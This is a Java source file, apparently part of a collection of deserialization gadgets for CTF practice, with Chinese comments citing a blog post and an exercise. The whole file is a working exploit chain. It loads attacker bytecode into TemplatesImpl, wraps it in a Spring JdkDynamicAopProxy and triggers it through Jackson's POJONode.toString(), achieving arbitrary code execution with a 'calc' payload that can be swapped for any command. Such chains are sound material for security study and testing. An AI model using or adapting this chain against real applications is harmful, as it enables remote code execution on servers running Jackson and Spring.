package Seri.POJONodeGadgets;


import Seri.Utils;
import com.fasterxml.jackson.databind.node.POJONode;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.springframework.aop.framework.AdvisedSupport;

import javax.xml.transform.Templates;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;

/**
 *  因为原生的 POJONode 会调用的 TemplatesImpl 所有的 getter
 *  如果调用到其他的 getter 就有可能会报错
 *  所以需要设置一个代理，避免掉调用其他 getter
 *
 *  Blog: https://xz.aliyun.com/t/12846
 *  例题: https://www.yuque.com/dat0u/ctf/zticsggntervfyue#i1443
 */
public class POJONodeBetter {
    public static void main(String[] args) throws Exception {
        byte[] bytes = Utils.getEvilPayload("calc");
        TemplatesImpl templates = new TemplatesImpl();
        Utils.setValue(templates , "_bytecodes", new byte[][]{bytes});
        Utils.setValue(templates , "_name", "gadgets");
        Utils.setValue(templates , "_tfactory", new TransformerFactoryImpl());


        // 设置代理
        AdvisedSupport advisedSupport = new AdvisedSupport();
        advisedSupport.setInterfaces(Templates.class.getInterfaces());
        advisedSupport.setTarget(templates);
        Constructor constructor = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy")
                .getConstructor(AdvisedSupport.class);
        constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport);
        Object proxy = Proxy.newProxyInstance(
                ClassLoader.getSystemClassLoader(),
                new Class[]{Templates.class},
                handler
        );

        POJONode pojoNode = new POJONode(proxy);
        pojoNode.toString();


    }
}
